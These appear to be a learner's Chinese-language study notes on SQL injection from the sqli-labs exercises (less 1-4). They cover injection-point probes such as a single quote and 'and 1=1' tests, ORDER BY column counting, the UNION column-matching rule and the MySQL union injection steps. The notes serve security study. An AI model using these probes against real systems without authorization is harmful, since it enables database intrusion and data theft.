二、学习总结

  • 什么是sql注入?
    Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击。
  • less 1-4 都是用到了请求方式中的get请求方法。
    get请求是从指定的资源请求数据，它的特点是参数直接从url中传递；还有一种请求方法为post，post是向指定的资源提交要被处理的数据，它的特点是常以提交表单形式传递参数。
    参考博客：(https://blog.csdn.net/helloc0de/article/details/76142478)
  • sql注入的参数类型
    sql注入的参数类型分为字符型和数字型。less 1，less 3和less 4是字符型，less 2 是数字型
  • sql注入点怎么判断？
    1、加入单引号’提交
    2、数字型的判断：通常使用and 1=1 ;and 1=2
    3、字符型的判断：通常使用’ and ‘1’=1；’ and ‘1=2
    4、搜索型的判断：简单的判断搜索型注入漏洞存在不存在的办法是先搜索’，如果出错，说明90%存在这个漏洞。然后搜
    索%，如果正常返回，说明95%有洞了。
    参考博客(https://www.cnblogs.com/SCHAOGES/p/10889654.html)
  • order by函数的原理
    order by 后面跟哪个列名就是通过跟哪个列进行排序，如果后面跟的是数字，那么1就代表根据第一列排序，2代表第二列，3代表第三列，那么一直输入数字的大小就可以判断数据表有多少列了
  • union函数使用的注意点
    在使用 union 查询的时候需要和主查询的列数相同
  • MYSQL数据库联合注入流程
    1、判断是否存在注入点
    2、判断查询列数，显示位置
    3、获取数据库信息
